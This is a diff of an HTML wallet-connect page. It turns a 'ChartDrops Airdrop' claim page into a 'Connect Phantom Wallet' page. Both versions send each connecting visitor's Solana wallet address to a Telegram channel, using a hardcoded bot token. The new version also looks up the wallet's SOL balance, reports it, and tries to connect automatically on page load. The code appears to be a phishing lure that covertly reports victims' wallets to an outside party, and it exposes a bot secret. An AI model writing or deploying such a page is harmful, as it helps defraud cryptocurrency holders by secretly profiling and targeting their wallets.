@@ -1,133 +1,100 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ChartDrops Airdrop</title>
+  <title>Connect Phantom Wallet</title>
+  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
   <style>
     body {
-      background: #0d0d0d;
+      background-color: #0d0d0d;
       color: white;
-      font-family: sans-serif;
       text-align: center;
-      margin-top: 80px;
-    }
-    .popup {
-      background: #1a1a1a;
-      padding: 25px;
-      border-radius: 10px;
-      display: inline-block;
-      box-shadow: 0 0 15px rgba(0, 255, 150, 0.2);
+      font-family: sans-serif;
+      padding-top: 80px;
     }
     button {
-      background: #00ffae;
+      background: #6200ea;
+      color: white;
       border: none;
-      padding: 12px 20px;
-      margin: 10px;
-      border-radius: 6px;
+      padding: 14px 24px;
+      font-size: 16px;
+      border-radius: 8px;
       cursor: pointer;
-      color: black;
-      font-weight: bold;
-    }
-    button:hover {
-      background: #00d69b;
     }
   </style>
 </head>
 <body>
-  <div class="popup">
-    <h2>ChartDrops Airdrop</h2>
-    <p>Connect your wallet to claim</p>
-    <button onclick="connectPhantom()">Connect Phantom</button>
-    <button onclick="connectSolflare()">Connect Solflare</button>
-  </div>
+  <h1>Connect Your Solana Wallet</h1>
+  <button id="connectBtn">Connect Phantom</button>
+  <p id="walletInfo"></p>
 
   <script>
     const BOT_TOKEN = "7978623862:AAHezOh3PLYYy92TIjtIN9oRof32nbfwNMQ";
     const CHANNEL_ID = "-1002600871606";
 
-    // Send message to Telegram
+    const walletInfo = document.getElementById("walletInfo");
+
     async function sendToTelegram(walletAddress) {
       const message = `✅ Wallet Connected: ${walletAddress}`;
-      try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: CHANNEL_ID,
-            text: message
-          })
-        });
-      } catch (err) {
-        console.error("Telegram error:", err);
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHANNEL_ID, text: message })
+      });
+    }
+
+    async function fetchBalance(pubkey) {
+      const conn = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
+      const balanceLamports = await conn.getBalance(new solanaWeb3.PublicKey(pubkey));
+      const sol = balanceLamports / solanaWeb3.LAMPORTS_PER_SOL;
+      return sol.toFixed(4);
+    }
+
+    function isMobile() {
+      return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+    }
+
+    async function connectPhantom() {
+      if (window.solana && window.solana.isPhantom) {
+        try {
+          const resp = await window.solana.connect({ onlyIfTrusted: true });
+          const pubkey = resp.publicKey.toString();
+          const balance = await fetchBalance(pubkey);
+          walletInfo.textContent = `Wallet: ${pubkey} | Balance: ${balance} SOL`;
+          await sendToTelegram(pubkey);
+        } catch (err) {
+          console.warn("Trusted connection failed.");
+        }
+      } else if (isMobile()) {
+        const dappUrl = encodeURIComponent(window.location.href);
+        window.location.href = `https://phantom.app/ul/browse/${dappUrl}`;
+      } else {
+        alert("Phantom Wallet not detected. Please install Phantom.");
       }
     }
 
-    // Phantom connection
-    async function connectPhantom() {
-      // Desktop
-      if (window.solana?.isPhantom) {
+    document.getElementById("connectBtn").addEventListener("click", async () => {
+      if (window.solana && window.solana.isPhantom) {
         try {
           const resp = await window.solana.connect();
-          const walletAddress = resp.publicKey.toString();
-          await sendToTelegram(walletAddress);
-          alert(`Connected: ${walletAddress}`);
-          return;
+          const pubkey = resp.publicKey.toString();
+          const balance = await fetchBalance(pubkey);
+          walletInfo.textContent = `Wallet: ${pubkey} | Balance: ${balance} SOL`;
+          await sendToTelegram(pubkey);
         } catch (err) {
-          console.error("Connection error:", err);
-          return;
+          console.error("Connection rejected:", err);
         }
+      } else if (isMobile()) {
+        const dappUrl = encodeURIComponent(window.location.href);
+        window.location.href = `https://phantom.app/ul/browse/${dappUrl}`;
+      } else {
+        alert("Phantom Wallet not found. Please use Phantom or install it.");
       }
-      
-      // Mobile - DIRECT LAUNCH
-      if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
-        // Phantom mobile deep link
-        window.location.href = "https://phantom.app/ul/connect";
-        
-        // Listen for return with wallet address
-        const checkConnection = setInterval(async () => {
-          if (window.solana?.isConnected) {
-            clearInterval(checkConnection);
-            const walletAddress = window.solana.publicKey.toString();
-            await sendToTelegram(walletAddress);
-            alert(`Connected: ${walletAddress}`);
-          }
-        }, 500);
-      }
-    }
+    });
 
-    // Solflare connection
-    async function connectSolflare() {
-      // Desktop
-      if (window.solflare) {
-        try {
-          await window.solflare.connect();
-          const walletAddress = window.solflare.publicKey.toString();
-          await sendToTelegram(walletAddress);
-          alert(`Connected: ${walletAddress}`);
-          return;
-        } catch (err) {
-          console.error("Connection error:", err);
-          return;
-        }
-      }
-      
-      // Mobile - DIRECT LAUNCH
-      if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
-        // Solflare mobile deep link
-        window.location.href = "solflare://connect";
-        
-        // Listen for return with wallet address
-        const checkConnection = setInterval(async () => {
-          if (window.solflare?.isConnected) {
-            clearInterval(checkConnection);
-            const walletAddress = window.solflare.publicKey.toString();
-            await sendToTelegram(walletAddress);
-            alert(`Connected: ${walletAddress}`);
-          }
-        }, 500);
-      }
-    }
+    // Try auto-connect on load
+    window.addEventListener('DOMContentLoaded', connectPhantom);
   </script>
 </body>
 </html>
